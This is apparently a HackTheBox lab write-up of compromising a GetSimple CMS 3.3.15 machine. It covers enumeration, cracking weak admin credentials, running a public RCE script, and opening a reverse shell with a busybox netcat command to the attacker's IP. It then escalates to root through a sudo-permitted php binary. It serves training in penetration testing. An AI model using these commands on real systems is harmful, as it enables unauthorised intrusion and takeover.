# HackTheBox - GettingStarted - ctxzero

---

### Enumeration
First quick scan:
nmap -sS -p- 10.129.162.26
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:10 EST
Nmap scan report for 10.129.162.26
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds

```


Second scan: nmap -sS -sCV -O 10.129.162.26 / you could just specify the ports for more speed, eg: nmap -sS -sCV -O -p 22,80 10.129.162.26 
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 18:13 EST
Nmap scan report for 10.129.162.26
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry 
|_/admin/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds
```

Now we just added the dns to our /etc/hosts so we dont have to use the ip all the time

Next we did a Gobuster Scan as follows: gobuster dir -u http://gettingstarted.htb/ -w /usr/share/wordlists/dirb/big.txt -x txt,php,html -t 49
```
/LICENSE.txt          (Status: 200) [Size: 35147]
/admin                (Status: 301) [Size: 314] [--> http://10.129.162.26/admin/]
/backups              (Status: 301) [Size: 316] [--> http://10.129.162.26/backups/]
/data                 (Status: 301) [Size: 313] [--> http://10.129.162.26/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.162.26/plugins/]
/readme.txt           (Status: 200) [Size: 1958]
/robots.txt           (Status: 200) [Size: 32]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 314] [--> http://10.129.162.26/theme/]
```

So after enumerating the directories we found that the getsimple cms is in use --> readme.txt directory
We also found the Credentials for the admin account -> data/users/admin.xml
<img width="622" height="198" alt="image" src="https://github.com/user-attachments/assets/2046138b-4dfe-4a03-b04a-44ba71ca9dbf" />

After cracking the password, it's: admin

So we logged in as admin through /admin

Next we checked for any Public exploit, since we found out the CMS version at the Admin Panel --> 3.3.15

We found this Python script: https://github.com/cybersecaware/GetSimpleCMS-RCE

after cloning it to our VM we tried the script and its working

So we started a listener on our machine:

```
nc -lvnp 7777
```

Tried multiple Revshells from: https://revshells.com
and quickly this one was working:
```
busybox nc 10.10.16.47 7777 -e sh
```

So we had a Shell

Our shell wasnt great so we upgraded to a better TTY:
```
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```

now we could just get the flag.txt at: /home/mrb3n

now we had to privesc our way to root: sudo -l
```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

So we could abuse the php binary!

So we took a look at https://gtfobins.github.io/gtfobins/php/#sudo

After using the paylod we had root and could just read the root.txt


Thanks for Reading
